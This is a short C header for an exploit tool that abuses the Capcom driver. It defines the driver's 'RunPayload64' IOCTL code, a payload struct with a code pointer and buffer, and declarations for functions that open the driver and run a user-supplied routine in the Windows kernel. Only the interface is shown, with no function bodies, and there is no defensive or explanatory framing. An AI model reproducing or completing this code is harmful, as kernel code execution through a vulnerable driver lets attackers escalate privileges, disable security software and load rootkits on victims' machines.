#pragma once
#include <windows.h>
#include <winternl.h>

#define IOCTL_RunPayload64  0xAA013044
#define PAYLOAD_BUFFER_SIZE 0x200
// #define DPFLTR_ERROR_LEVEL  0
// #define DPFLTR_IHVDRIVER_ID 77

typedef PVOID(NTAPI* MmGetSystemRoutineAddress_t)(PUNICODE_STRING);
typedef VOID(NTAPI* UserFunc)(MmGetSystemRoutineAddress_t, PVOID userData);
static HANDLE device;

struct CapcomCodePayload {
    BYTE* pointerToPayload;
    BYTE  payload[PAYLOAD_BUFFER_SIZE];
};


BOOL InitDriver();
FARPROC GetRoutine(MmGetSystemRoutineAddress_t, const wchar_t*);
void RunInKernel(UserFunc func, PVOID userData);